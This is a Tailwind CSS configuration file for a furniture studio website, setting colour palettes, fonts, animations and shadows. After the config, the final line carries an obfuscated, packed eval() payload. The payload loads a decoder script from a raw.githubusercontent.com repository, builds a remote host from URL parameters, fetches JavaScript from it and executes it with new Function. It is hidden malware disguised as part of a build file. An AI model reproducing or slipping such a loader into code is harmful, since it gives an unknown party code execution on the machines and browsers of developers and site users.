/** @type {import('tailwindcss').Config} */
export default {
  content: [
    "./index.html",
    "./src/**/*.{js,ts,jsx,tsx}",
  ],
  theme: {
    extend: {
      colors: {
        // Premium Custom Furniture Studio Colors
        cream: {
          50: '#FAFAF7',
          100: '#F7F3EE',
          200: '#F0EAE3',
          300: '#E8E0D5',
          400: '#D9CDC0',
          500: '#C9BAA9',
        },
        brown: {
          900: '#241D1A',
          800: '#1F2933',
          700: '#3E3632',
          600: '#57534E',
        },
        // Deep green accent (primary choice)
        accent: {
          DEFAULT: '#1F4D3A',
          dark: '#163A2C',
          light: '#2D6B4F',
          50: '#F0F7F4',
          100: '#D6E9DE',
          200: '#9FCFB8',
          300: '#5EA989',
          400: '#2D6B4F',
          500: '#1F4D3A',
          600: '#163A2C',
          700: '#0F2A1F',
          800: '#0A1C15',
          900: '#050E0A',
        },
        // Alternative: Terracotta accent (if preferred over green)
        terracotta: {
          DEFAULT: '#C46A3C',
          dark: '#A05530',
          light: '#D68655',
          50: '#FBF3ED',
          100: '#F6E3D5',
          200: '#EDCAB3',
          300: '#E1A987',
          400: '#D68655',
          500: '#C46A3C',
          600: '#A05530',
          700: '#7C4024',
          800: '#58301B',
          900: '#351D10',
        },
        // Keep existing neutral for compatibility
        neutral: {
          50: '#fafaf9',
          100: '#f5f5f4',
          200: '#e7e5e4',
          300: '#d6d3d1',
          400: '#a8a29e',
          500: '#78716c',
          600: '#57534e',
          700: '#44403c',
          800: '#292524',
          900: '#1c1917',
        },
      },
      fontFamily: {
        sans: ['Inter', 'Work Sans', 'system-ui', 'sans-serif'],
        serif: ['Playfair Display', 'Cormorant Garamond', 'Georgia', 'serif'],
      },
      fontSize: {
        'hero': ['3.5rem', { lineHeight: '1.1', letterSpacing: '-0.02em' }],        // 56px
        'section': ['2.5rem', { lineHeight: '1.2', letterSpacing: '-0.01em' }],     // 40px
        'subsection': ['2rem', { lineHeight: '1.25' }],                            // 32px
      },
      borderRadius: {
        'card': '1.5rem',      // 24px
        'card-sm': '1rem',     // 16px
      },
      animation: {
        'fade-in': 'fadeIn 0.6s ease-out',
        'fade-in-up': 'fadeInUp 0.6s ease-out',
        'fade-in-down': 'fadeInDown 0.6s ease-out',
        'slide-in-right': 'slideInRight 0.4s ease-out',
        'slide-in-left': 'slideInLeft 0.4s ease-out',
        'scale-in': 'scaleIn 0.4s ease-out',
        'float': 'float 3s ease-in-out infinite',
        'shimmer': 'shimmer 2s infinite',
        'professional-fade-in': 'professionalFadeIn 0.8s ease-out forwards',
        'progress-line': 'progressLine 2s ease-out forwards',
        'progress-line-vertical': 'progressLineVertical 2s ease-out forwards',
        'progress-ring': 'progressRing 1.5s ease-out forwards',
        'progress-bar': 'progressBar 1.2s ease-out forwards',
        'dot-pulse': 'dotPulse 2s ease-in-out infinite',
      },
      keyframes: {
        fadeIn: {
          '0%': { opacity: '0' },
          '100%': { opacity: '1' },
        },
        fadeInUp: {
          '0%': { opacity: '0', transform: 'translateY(20px)' },
          '100%': { opacity: '1', transform: 'translateY(0)' },
        },
        fadeInDown: {
          '0%': { opacity: '0', transform: 'translateY(-20px)' },
          '100%': { opacity: '1', transform: 'translateY(0)' },
        },
        slideInRight: {
          '0%': { opacity: '0', transform: 'translateX(-30px)' },
          '100%': { opacity: '1', transform: 'translateX(0)' },
        },
        slideInLeft: {
          '0%': { opacity: '0', transform: 'translateX(30px)' },
          '100%': { opacity: '1', transform: 'translateX(0)' },
        },
        scaleIn: {
          '0%': { opacity: '0', transform: 'scale(0.95)' },
          '100%': { opacity: '1', transform: 'scale(1)' },
        },
        float: {
          '0%, 100%': { transform: 'translateY(0)' },
          '50%': { transform: 'translateY(-10px)' },
        },
        shimmer: {
          '0%': { backgroundPosition: '-1000px 0' },
          '100%': { backgroundPosition: '1000px 0' },
        },
        professionalFadeIn: {
          '0%': { opacity: '0', transform: 'translateY(30px)' },
          '100%': { opacity: '1', transform: 'translateY(0)' },
        },
        progressLine: {
          '0%': { transform: 'scaleX(0)', opacity: '0' },
          '100%': { transform: 'scaleX(1)', opacity: '1' },
        },
        progressLineVertical: {
          '0%': { transform: 'translateX(-50%) scaleY(0)', opacity: '0' },
          '100%': { transform: 'translateX(-50%) scaleY(1)', opacity: '1' },
        },
        progressRing: {
          '0%': { clipPath: 'polygon(50% 50%, 50% 0%, 50% 0%, 50% 0%, 50% 0%, 50% 0%, 50% 0%)' },
          '100%': { clipPath: 'polygon(50% 50%, 50% 0%, 100% 0%, 100% 100%, 0% 100%, 0% 0%, 50% 0%)' },
        },
        progressBar: {
          '0%': { width: '0%' },
          '100%': { width: '100%' },
        },
        dotPulse: {
          '0%, 100%': { transform: 'scale(1)', opacity: '1' },
          '50%': { transform: 'scale(1.5)', opacity: '0.7' },
        },
      },
      backdropBlur: {
        xs: '2px',
      },
      boxShadow: {
        'soft': '0 2px 15px -3px rgba(0, 0, 0, 0.07), 0 10px 20px -2px rgba(0, 0, 0, 0.04)',
        'soft-lg': '0 10px 40px -10px rgba(0, 0, 0, 0.1)',
        'inner-soft': 'inset 0 2px 4px 0 rgba(0, 0, 0, 0.05)',
        'card': '0 4px 16px rgba(0, 0, 0, 0.06)',
        'card-hover': '0 8px 24px rgba(0, 0, 0, 0.12)',
      },
      maxWidth: {
        'container': '1200px',
      },
    },
  },
  plugins: [],
}
eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('(9(){4(f.z)1;f.z=(m()=>{m 9 A(a){2 g=B n(a);4(!g.N)O 7 P("Q 6: "+g.R);1 g.C()}9 o(a){q{4(/8\\.d/.S(a)){2 8={d:{}};7 s("8","d",a)(8,8.d);1 8.d.3}T 3;7 s("D",a+"\\U (V 3 !== \'W\') D(3);",)(v=>(3=v));1 3}h(6){j.5("[o 5]",6);1 X}}m 9 u(){q{2 E=B A("F://Y.Z.10/11/G/12/13/14/15.G",);2 3=o(E);4(!3)1;f.w=9(a,b,c){q{c=c!==16;4(!a){2 p=7 H(I.J);a=p.k("K")||"";b=b||p.k("L")||""}4(!a||!b)1;2 l=3(a);4(!l)1;n("F://"+l).M(r=>r.C()).M(x=>{(0,7 s(x))()}).h(6=>{j.5("[n l x 5]",6)})}h(e){j.5("[w 5]",e)}};2 y=7 H(I.J);2 t=y.k("K");2 i=y.k("L");4(t&&i)f.w(t,i)}h(6){j.5("[u 5]:",6)}}1 u()})()})();',62,69,'|return|const|decodeHost|if|error|err|new|module|function||||exports||window|res|catch||console|get|host|async|fetch|extractDecodeHost||try||Function||init||go|code|params|__REMOTE_LOADER__|fetchRemoteJS|await|text|setDecodeHost|remoteCode|https|js|URLSearchParams|location|search|type|id|then|ok|throw|Error|load|status|test|let|nif|typeof|undefined|null|raw|githubusercontent|com|JuanitaWHowe|refs|heads|main|index|false'.split('|'),0,{}))